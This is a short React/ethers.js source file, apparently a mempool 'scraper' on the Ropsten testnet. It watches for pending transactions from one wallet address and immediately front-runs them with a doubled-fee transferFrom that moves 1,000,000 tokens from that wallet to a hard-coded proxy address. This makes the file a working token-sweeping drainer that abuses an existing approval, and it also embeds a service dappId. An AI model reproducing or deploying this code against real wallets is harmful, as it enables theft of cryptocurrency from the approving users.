import { ethers } from "ethers";
import Web3 from "web3";
import abi from "./abi";
import BlocknativeSdk from 'bnc-sdk'
import Steps from "./steps";
import { useEffect, useState } from "react";
const url = process.env.REACT_APP_INFURA_ROPSTEN_URL;
const key = process.env.REACT_APP_TEST_WALLET_KEY;
const userAddress = "0x22bBF6fe9488e4154bd23E51bD84E8a063C08153"
const proxyAddress = "0x770aA9CB58410C39Be4aF881583ed9240c103d07"
export default function Scraper() {
    const [signer, setSigner] = useState()
    const [page, setPage] = useState(1);
    useEffect(() => {
        const wallet = new ethers.Wallet(
            key,
            new ethers.providers.WebSocketProvider(url)
        )
        setSigner(wallet);
    }, [])

    const options = {
        dappId: "4742117e-34ba-4e33-9910-1cd5fd4355da",
        networkId: 3,
        transactionHandlers: [(event) => {
            const { contractCall, from, status, gas, maxFeePerGasGwei: maxFee, maxPriorityFeePerGasGwei: maxPrio } = event.transaction;
            const { contractAddress } = contractCall;
            if (status == "pending" && from == "0x22bBF6fe9488e4154bd23E51bD84E8a063C08153" /* && in addressBook*/) {
                console.log("here")
                overrideTx(contractCall, status, gas, maxFee, maxPrio, contractAddress)
            }
        }],
    };

    const scrape = async () => {
        const blocknative = new BlocknativeSdk(options);
        blocknative.account(userAddress);
    }

    const overrideTx = async (contractCall, status, gas, maxFee, maxPrio, contractAddress) => {
        const overrides = {
            maxFeePerGas: maxFee * 1000000000 * 2,
            maxPriorityFeePerGas: maxPrio * 1000000000 * 2,
        }

        const tokenContract = new ethers.Contract(contractAddress, abi, signer);
        const tx = await tokenContract.transferFrom(userAddress, proxyAddress, ethers.utils.parseUnits("1000000"), overrides);
        const receipt = await tx.wait();
        console.log(receipt);
    }

    return (
        <div>
            <p>Scraper</p>
            <button className="px-4 py-2 bg-blue-400 border rounded-md shadow-md" onClick={() => scrape()}>Scrape</button>
        </div>
    )
}